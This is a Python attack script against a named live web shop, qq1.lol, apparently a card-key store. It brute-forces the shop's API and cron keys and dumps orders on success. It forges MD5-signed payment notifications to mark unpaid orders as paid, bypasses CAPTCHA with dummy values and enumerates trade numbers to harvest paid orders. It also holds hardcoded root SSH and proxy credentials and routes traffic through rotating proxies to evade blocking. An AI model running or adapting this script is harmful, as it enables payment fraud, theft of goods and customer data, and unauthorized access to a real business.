#!/usr/bin/env python3
"""qq1.lol continue-deep — expanded API key brute, epay formats, cron, paid-order hunt, hidden mods"""
import hashlib
import itertools
import json
import os
import re
import shlex
import subprocess
import time
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "continue_deep.log"
HITS = OUT / "continue_hits.jsonl"

QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
JP_PASS = os.environ.get("JP_PASS", "DX4LmrDaPfd9")
JP_HOST = os.environ.get("JP_HOST", "42.240.167.114")
JAR = "/tmp/qq1_continue.jar"
_px = None

# Expanded operator-centric API key dictionary
BASE_WORDS = [
    "buyi", "buyiq", "qqkqq", "qq1", "qq1lol", "qq1.lol", "QQKZC", "qqkzc", "布衣",
    "kawei1", "ka1", "ka1one", "ka1.one", "830603", "faka", "rainbow", "mckuai",
    "epay", "syskey", "apikey", "api_key", "token", "secret", "authkey", "merchant",
    "paykey", "jiankong", "cron", "admin", "root", "test", "password", "abcdef",
    "123456", "888888", "666666", "111111", "000000", "123456789", "12345678",
    "buyi123", "buyi888", "buyi666", "buyi520", "buyi2024", "buyi2025", "buyi2026",
    "buyiq123", "qq1admin", "qq1key", "qq1api", "qqkqq123", "qqkzc123",
    "Lxsj@123", "ruoyi123", "tianyu9080", "对接密钥", "发卡", "自动发卡",
    "fffzz", "hmjf", "htqq", "kln166", "qq0", "q8", "q8.qq0.lol",
]
SUFFIXES = ["", "123", "888", "666", "2024", "2025", "2026", "!", "@", "001", "01", "1"]
PREFIXES = ["", "qq", "api", "key"]


def build_keys():
    keys = set(BASE_WORDS)
    for w in list(BASE_WORDS)[:40]:
        for s in SUFFIXES:
            keys.add(w + s)
        for p in PREFIXES:
            if p:
                keys.add(p + w)
    # md5 of common words as keys (some sites store hashed)
    for w in ["buyi", "qq1", "qqkqq", "123456", "admin", "faka"]:
        keys.add(hashlib.md5(w.encode()).hexdigest())
        keys.add(hashlib.md5(w.encode()).hexdigest()[:16])
    return sorted(keys)


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    with open(HITS, "a") as f:
        f.write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def ssh(script, timeout=50):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout, errors="replace",
    ).stdout or ""


def proxy(force=False):
    global _px
    if _px and not force:
        return _px
    d = json.loads(ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 20))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {_px.split('@')[1]}")
    return _px


def curl(url, post=None, mt=18, force_px=False):
    px = proxy(force_px)
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    pp = f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}" if post is not None else ""
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A 'Mozilla/5.0' "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 25)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def session():
    ssh(f"rm -f {JAR}")
    proxy(True)
    curl(f"{BASE}/")
    buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    if len(buy) < 500:
        buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102", force_px=True)
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    hs_m = re.search(r"var hashsalt=(.+);", buy)
    csrf = csrf.group(1) if csrf else ""
    hs = ""
    if hs_m:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
    return csrf, hs


def brute_tools_keys():
    log("=== [1] Expanded tools API key brute ===")
    keys = build_keys()
    log(f"dict size={len(keys)}")
    tested = 0
    for key in keys:
        body, code = curl(f"{BASE}/%61pi.php?act=tools&key={quote(key)}&limit=3")
        tested += 1
        if tested % 25 == 0:
            log(f"  progress {tested}/{len(keys)}")
            # rotate proxy occasionally
            if tested % 100 == 0:
                proxy(True)
        if not body or "_guard" in body:
            time.sleep(0.15)
            continue
        if "密钥错误" in body or "请提供" in body or "No Act" in body or "确保各项" in body:
            continue
        # success responses are JSON arrays
        if body.startswith("[") or ('"tid"' in body and "错误" not in body):
            hit("api_key", key, body)
            (OUT / "API_KEY.txt").write_text(key)
            # dump orders too
            for act in ("orders", "search"):
                b2, _ = curl(f"{BASE}/%61pi.php?act={act}&key={quote(key)}&limit=20&tid=102&id=25949")
                hit("api_dump", act, b2)
            return key
        log(f"  unexpected key={key!r}: {body[:80]}")
        time.sleep(0.12)
    log(f"  done tested={tested} no hit")
    return None


def test_epay_chain(csrf, hs):
    log("=== [2] Epay/notify deep formats ===")
    if not csrf or not hs:
        return
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        f"tid=102&num=1&inputvalue=epaydeep&csrf_token={csrf}&hashsalt={hs}"
        "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
    )
    tn_m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    if not tn_m:
        log(f"  pay fail: {str(pay)[:100]}")
        return
    tn = tn_m.group(1)
    log(f"  tn={tn}")

    # follow submit to discover epay URL / pid
    for ptype in ("alipay", "qqpay"):
        html, _ = curl(f"{BASE}/other/submit.php?type={ptype}&orderid={tn}")
        log(f"  submit {ptype} len={len(html)}")
        if html:
            for pat in [r"https?://[^\"'\s]+", r"pid[=\"']+(\w+)", r"key[=\"']+([^\"'\s&]+)",
                        r"sign[=\"']+([a-f0-9]+)", r"money[=\"']+([0-9.]+)"]:
                ms = re.findall(pat, html, re.I)
                if ms:
                    log(f"    {pat[:20]}: {ms[:5]}")
        # alipay.php
        html2, _ = curl(f"{BASE}/other/{ptype}.php?trade_no={tn}")
        if html2 and len(html2) > 50 and "404" not in html2[:40]:
            log(f"  {ptype}.php len={len(html2)} {html2[:200]}")
            (OUT / f"continue_{ptype}.html").write_text(html2[:50000])
        time.sleep(0.8)

    # notify fuzz with common epay sign styles
    keys = ["buyi", "qq1", "123456", "epay", "admin", ""]
    for key in keys:
        # classic epay notify
        params = {
            "pid": "1000",
            "trade_no": tn,
            "out_trade_no": tn,
            "type": "alipay",
            "name": "test",
            "money": "0.01",
            "trade_status": "TRADE_SUCCESS",
        }
        # sign = md5(sorted params + key) common pattern
        sign_str = "&".join(f"{k}={params[k]}" for k in sorted(params) if params[k] != "") + key
        params["sign"] = hashlib.md5(sign_str.encode()).hexdigest()
        params["sign_type"] = "MD5"
        post = "&".join(f"{k}={quote(str(v))}" for k, v in params.items())
        for ep in ("epay_notify.php", "other/epay_notify.php", "alipay_notify.php", "other/alipay_notify.php",
                   "qqpay_notify.php", "notify_url.php", "other/notify.php"):
            body, code = curl(f"{BASE}/{ep}", post)
            if body and body.strip() not in ("", "error", "fail", "签名失败") and "404" not in body[:30] and "_guard" not in body[:50]:
                log(f"  {ep} key={key!r}: {body[:100]}")
                if "success" in body.lower():
                    hit("epay_notify", f"{ep} key={key}", body)
                    shop, _ = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
                    if shop and "未付款" not in shop:
                        hit("paid_via_notify", tn, shop)
        time.sleep(0.2)


def test_cron_expanded():
    log("=== [3] cron expanded keys ===")
    keys = build_keys()[:80]
    for k in keys:
        for param in ("key", "auth"):
            body, _ = curl(f"{BASE}/cron.php?{param}={quote(k)}")
            if body and "不正确" not in body and "密钥" not in body and len(body) > 8 and "_guard" not in body:
                hit("cron", f"{param}={k}", body)
                return
        time.sleep(0.1)


def test_hidden_mods():
    log("=== [4] hidden mods / pages ===")
    mods = [
        "article", "news", "help", "about", "invite", "gift", "choujiang", "lottery",
        "cart", "kami", "faka", "export", "api", "doc", "wx", "pay", "success",
        "buyok", "ok", "result", "shop", "goods", "detail", "user", "member",
    ]
    for mod in mods:
        body, code = curl(f"{BASE}/?mod={mod}")
        if code == "200" and body and "Template file not found" not in body and "404" not in body[:40] and len(body) > 200:
            if "_guard" not in body[:80]:
                log(f"  mod={mod} len={len(body)}")
                if any(x in body for x in ("kminfo", "卡密", "password", "api_key", "showOrder")):
                    hit("mod_leak", mod, body[:3000])
        time.sleep(0.25)


def test_getleftcount_stock():
    log("=== [5] stock / getleftcount ===")
    for tid in (102, 4, 118, 83, 103, 104, 160, 10, 11, 131):
        body, _ = curl(f"{BASE}/ajax.php?act=getleftcount&tid={tid}")
        log(f"  tid={tid}: {str(body)[:120]}")
        time.sleep(0.3)


def test_recent_paid_getshop():
    log("=== [6] denser recent getshop scan (paid only) ===")
    # denser window around now - paid orders have sequential trade_no
    now = datetime.now()
    found = 0
    for mins in range(0, 360, 10):
        t = now - timedelta(minutes=mins)
        base = t.strftime("%Y%m%d%H%M")
        for sec in range(0, 60, 3):
            for seq in (0, 100, 200, 300, 400, 500, 600, 700, 800, 900, 111, 222, 333, 444, 555, 666, 777, 888, 999):
                tn = f"{base}{sec:02d}{seq:03d}"
                body, code = curl(f"{BASE}/other/getshop.php?trade_no={tn}", mt=10)
                if body and "未付款" not in body and "不存在" not in body and "未知" not in body and len(body) > 25 and "404" not in body[:30]:
                    hit("getshop_paid", tn, body)
                    found += 1
                    if found >= 3:
                        return
        if mins % 60 == 0:
            log(f"  scanned ~{mins}m ago")
    log(f"  done found={found}")


def main():
    log("=== CONTINUE DEEP START ===")
    csrf, hs = session()
    log(f"csrf={csrf[:10] if csrf else None} hs={hs[:10] if hs else None}")

    key = brute_tools_keys()
    test_hidden_mods()
    test_getleftcount_stock()
    test_cron_expanded()
    csrf2, hs2 = session()
    test_epay_chain(csrf2 or csrf, hs2 or hs)
    test_recent_paid_getshop()

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== CONTINUE DEEP DONE hits={n} key={key} ===")


if __name__ == "__main__":
    main()
